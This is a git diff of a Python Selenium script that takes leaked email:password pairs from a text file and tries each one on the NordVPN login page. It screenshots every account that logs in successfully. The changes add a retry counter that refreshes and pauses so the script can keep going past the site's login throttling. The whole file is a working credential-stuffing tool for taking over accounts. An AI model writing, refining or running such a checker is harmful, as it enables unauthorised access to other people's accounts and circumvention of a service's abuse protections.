@@ -2,7 +2,7 @@ from selenium import webdriver
 from time import sleep
 import re
 
-account = open('Nordvpn Accounts.txt', 'r') #opens the NordVpn accounts
+account = open('Nordvpn Accounts.txt', 'r')  # opens the NordVpn accounts
 Accounts = account.read()
 pattern = r'[\w\.-]+@[\w\.-]+\.[\w\.]+'
 pattern2 = r':(\S+)'
@@ -12,23 +12,31 @@ password_match = re.findall(pattern2, Accounts)  # Extracts all the passwords fr
 
 driver = webdriver.Firefox()  # opens the Firefox webdriver
 driver.get('https://ucp.nordvpn.com/login/')  # open the Nordvpn login site
-sleep(25)
-
+sleep(26)
+number_of_retries = 0
 for i in range(len(email_match)) :
-    if i == 20 : #every 20 passwords it won't let you login so i refresh
+    if number_of_retries == 21 :  # every 20 passwords it won't let you login so i refresh
         driver.refresh()
+        number_of_retries = 0
+        sleep(10)
     driver.find_element_by_xpath('//*[@id="ucp_login_email_field"]').send_keys(email_match[i])  # Enters the email
-    driver.find_element_by_xpath('//*[@id="ucp_login_password_field"]').send_keys(password_match[i])  # enters the password
-    driver.find_element_by_xpath('/html/body/div[1]/div/div[2]/div/div/div/form/div/button').click()  # clicks the login button
+    driver.find_element_by_xpath('//*[@id="ucp_login_password_field"]').send_keys(
+        password_match[i])  # enters the password
+    driver.find_element_by_xpath(
+        '/html/body/div[1]/div/div[2]/div/div/div/form/div/button').click()  # clicks the login button
     print(i)
-    sleep(8)
+    sleep(9)
+    number_of_retries += 1
     if driver.current_url == 'https://ucp.nordvpn.com/dashboard/' :  # checks if the login is true
         sleep(2)
-        driver.save_screenshot(str(i) + ' .png')  # saves a screen shot of the username
-        driver.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div/div/div[2]/div/a').click()
+        print('found good account')
+        driver.save_screenshot(email_match[i] + '.png')  # saves a screen shot of the username
+        driver.find_element_by_xpath('/html/body/div[1]/div/div[2]/div/div/div/div[2]/div/a/span').click()
         sleep(8)
     else :
         driver.find_element_by_xpath('//*[@id="ucp_login_email_field"]').clear()  # clears the email for another try
-        driver.find_element_by_xpath('//*[@id="ucp_login_password_field"]').clear()  # clears the password for another try
+        driver.find_element_by_xpath(
+            '//*[@id="ucp_login_password_field"]').clear()  # clears the password for another try
         del password_match[:i]
+
 account.close()
